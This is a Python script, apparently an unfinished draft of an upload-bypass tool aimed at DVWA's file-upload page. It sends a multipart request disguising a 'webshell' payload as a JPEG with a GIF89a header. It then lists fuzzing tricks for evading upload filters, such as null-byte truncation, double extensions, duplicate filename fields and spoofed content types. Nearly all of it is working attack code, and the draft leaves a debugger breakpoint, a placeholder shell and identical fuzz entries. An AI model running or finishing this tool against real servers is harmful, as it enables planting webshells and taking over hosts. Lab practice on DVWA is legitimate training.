import pdb
import re
import sys
import argparse
from urllib.parse import urlparse
from exp10it import get_request
from exp10it import get_param_part_from_content
from exp10it import send_http_packet


def get_valid_post_info(url, cookie):
    content_length = 0
    post_data = ''
    return_value = {'content_length': content_length, 'post_data': post_data}
    rsp = get_request(url, cookie=cookie)
    html = rsp['content']
    if not re.search(r"<form\s+", html, re.I):
        print("Sorry,I can't find any form.")
        sys.exit(1)
    param_part = get_param_part_from_content(html)
    param_list = param_part.split("&")
    post_data += "\r\n"
    for param_and_value in param_list:
        _ = param_and_value.split("=")
        param = _[0]
        value = _[1]
        if value == "filevalue":
            # 文件参数
            param_and_value = boundary + \
                '\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg\r\n\r\n%s\r\n' % (
                    param, webshell)
            post_data += param_and_value
        else:
            # 非文件参数
            param_and_value = boundary + \
                '\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (
                    param, value)
            post_data += param_and_value
    post_data += (boundary + "--\r\n")
    content_length = len(post_data)
    return_value['content_length'] = content_length
    return_value['post_data'] = post_data
    return return_value


boundary = "---------------------------xxxxxxxxxxxxxxxxxxxx"
webshell = '''GIF89a
here is webshell content'''
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url")
parser.add_argument("--cookie")
parser.add_argument("--suffix")
args = parser.parse_args()
url = args.url
cookie = args.cookie
suffix = args.suffix
urlparsed = urlparse(url)
host = urlparsed.netloc
scheme = urlparsed.scheme
valid_post_info = get_valid_post_info(url, cookie)
valid_content_length = valid_post_info['content_length']
valid_post_data = valid_post_info['post_data']
header = '''POST /dvwa/vulnerabilities/upload/ HTTP/1.1
Host: %s
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: %s
Cookie: %s
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------xxxxxxxxxxxxxxxxxxxx
Content-Length: %s
''' % (host, url, cookie, valid_content_length)
header = header.replace("\n", "\r\n")
valid_post_packet = header + valid_post_data
pdb.set_trace()
rsp = send_http_packet(valid_post_packet, scheme)
if rsp['code'] == 200:
    print("正常上传jpg文件成功,现在开始尝试上传webshell后缀的文件...")
else:
    print("正常上传jpg文件失败,尝试上传正常gif文件...")
    print("正常上传gif文件失败,尝试上传正常png文件...")
    print("正常上传jpg/gif/png全部失败,这个url的上传功能可能存在问题...")


fuzz_file_name=[
        {'desc':'修改后缀为webshell后缀','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'修改后缀为.jpg;test.php','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'%00截断','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'双文件上传','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'两个filename参数','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'两个filename参数以空格分割','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'两个filename参数以Tab分割','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'两个filename参数以\\r\\n分割','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        ]
fuzz_content_type=[
        {'desc':'修改content-type为image/jpeg','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'修改content-type为image/gif','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'修改content-type为image/png','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'修改content-type为text/plain','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc':'修改content-type为xxx/xxx','modify':'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
       ] 
